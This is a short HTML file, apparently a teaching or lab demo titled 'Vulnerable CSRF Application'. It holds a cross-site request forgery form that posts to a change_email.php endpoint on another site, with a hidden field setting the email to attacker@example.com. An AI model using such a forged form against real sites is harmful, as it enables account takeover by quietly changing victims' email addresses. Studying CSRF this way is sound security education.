<!-- index.php -->
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable CSRF Application</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <h1>Change Email</h1>
    <form action="http://yourwebsite.com/change_email.php" method="post">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="submit" value="Change Email">
    </form>
</body>
</html>
